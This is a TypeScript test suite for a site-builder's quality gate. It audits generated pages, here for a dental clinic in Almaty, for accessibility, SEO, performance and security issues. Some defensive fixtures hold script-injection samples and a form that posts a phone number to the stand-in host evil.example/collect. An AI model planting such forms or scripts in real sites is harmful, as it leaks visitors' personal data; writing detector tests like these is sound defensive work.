import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { templateContent, type Brief, type Offer } from '../journey/artifacts.js';
import { renderPages } from '../journey/site-renderer.js';
import { templateSitemap } from '../journey/sitemap.js';
import { defaultQualityPolicy } from '../admin/quality-profiles.service.js';
import { auditSite } from './site-audit.js';
import { evaluateGate } from './gate.js';

const brief: Brief = { businessName: 'Улыбка', whatYouDo: 'Стоматология в Алматы', audience: 'Семьи с детьми', city: 'Алматы', mainAction: 'form', phone: '+7 701 000 00 00', messenger: null, email: null, address: 'Абая 10', tone: 'friendly' };
const offer: Offer = { services: [{ name: 'Лечение кариеса', description: null, price: 'от 15 000 ₸' }], hours: 'Пн–Сб 9–20' };
const design = { palette: 'ocean', font: 'modern', corners: 'rounded' as const, heroLayout: 'centered' as const };
const page = (body: string, head = '<title>Страница</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="Описание"><meta property="og:title" content="x">') =>
  ({ path: '/', html: `<!doctype html><html lang="ru"><head>${head}</head><body><h1>Заголовок</h1>${body}</body></html>` });
const ids = (html: { path: string; html: string }) => auditSite({ pages: [html], imageBytes: {} }).findings.map((finding) => finding.id).sort();

describe('quality gate of a build', () => {
  it('generated sites pass: one page and multi-page, with a form', () => {
    const single = renderPages({ brief, offer, content: templateContent(brief, offer), design, locale: 'ru', draft: false });
    const map = templateSitemap(brief, offer);
    const multi = renderPages({ brief, offer, content: templateContent(brief, offer, map), design, locale: 'ru', draft: false, sitemap: map });
    for (const pages of [single, multi]) {
      const audit = auditSite({ pages, imageBytes: {} });
      const blockingOrMedium = audit.findings.filter((finding) => finding.severity !== 'low');
      assert.deepEqual(blockingOrMedium, [], JSON.stringify(blockingOrMedium));
      const report = evaluateGate({ ...audit, auditVersion: 'test' }, defaultQualityPolicy(), null);
      assert.equal(report.status, 'passed');
      assert.equal(report.unmeasured.length, 3);
    }
  });

  it('finds what a hand-made or broken page would get wrong', () => {
    assert.deepEqual(ids(page('<p>ok</p>')), []);
    assert.deepEqual(ids(page('<script>alert(1)</script><a href="javascript:void(0)">x</a><button onclick="x()">Go</button>')), ['sec-inline-handlers', 'sec-javascript-url', 'sec-scripts']);
    assert.deepEqual(ids(page('<form action="https://evil.example/collect"><input name="phone"></form>')), ['a11y-form-labels', 'sec-form-action']);
    assert.deepEqual(ids(page('<label>Телефон <input name="phone"></label><label for="m">Почта</label><input id="m">')), []);
    assert.deepEqual(ids(page('<img src="http://cdn.example/a.jpg"><a href="https://x.example" target="_blank">x</a><a href="/"></a>')), ['a11y-img-alt', 'a11y-link-name', 'perf-img-size-attrs', 'sec-blank-rel', 'sec-mixed-content']);
    assert.deepEqual(ids(page('<h1>Второй</h1><h4>Пропуск</h4><p id="a"></p><p id="a"></p>')), ['a11y-duplicate-id', 'a11y-h1', 'a11y-heading-order']);
    assert.deepEqual(ids({ path: '/', html: '<html><head><meta name="viewport" content="width=device-width, user-scalable=no"><meta name="robots" content="noindex"></head><body><h1>x</h1></body></html>' }),
      ['a11y-lang', 'a11y-title', 'a11y-zoom', 'seo-description', 'seo-noindex', 'seo-og']);
  });

  it('checks page weight with photos and links between pages', () => {
    const id = '11111111-2222-4333-8444-555555555555';
    const heavy = page(`<img src="/img/${id}.webp" alt="Фото" width="10" height="10">`);
    let found = auditSite({ pages: [heavy], imageBytes: { [id]: 700 * 1024 } }).findings.map((finding) => finding.id);
    assert.deepEqual(found, ['perf-image']);
    found = auditSite({ pages: [heavy], imageBytes: { [id]: 3500 * 1024 } }).findings.map((finding) => `${finding.id}:${finding.severity}`);
    assert.deepEqual(found.sort(), ['perf-image:medium', 'perf-weight:high']);
    const two = [{ ...page('<a href="/net-takoy">x</a><a href="/privacy">Данные</a>') }, { path: '/o-nas', html: page('<a href="/">Главная</a>').html }];
    assert.deepEqual(auditSite({ pages: two, imageBytes: {} }).findings.map((finding) => finding.id), ['seo-broken-link']);
  });

  it('a required category with a blocking finding fails the gate; a profile can relax it', () => {
    const audit = auditSite({ pages: [page('<img src="/a.webp" width="1" height="1">')], imageBytes: {} });
    const strict = evaluateGate({ ...audit, auditVersion: 't' }, defaultQualityPolicy(), { key: 'default', version: 1 });
    assert.equal(strict.status, 'failed');
    assert.equal(strict.categories.find((category) => category.id === 'accessibility')!.status, 'failed');
    assert.deepEqual(strict.findings.map((finding) => finding.blocking), [true]);
    const relaxed = defaultQualityPolicy();
    relaxed.categories.accessibility = { enabled: true, required: false, maxOpenCritical: 0, maxOpenHigh: 0 };
    const report = evaluateGate({ ...audit, auditVersion: 't' }, relaxed, null);
    assert.equal(report.status, 'passed');
    assert.equal(report.categories.find((category) => category.id === 'accessibility')!.status, 'warning');
    // Medium findings never block with the default profile.
    const medium = auditSite({ pages: [page('<a href="/"></a>')], imageBytes: {} });
    assert.equal(evaluateGate({ ...medium, auditVersion: 't' }, defaultQualityPolicy(), null).status, 'passed');
  });
});
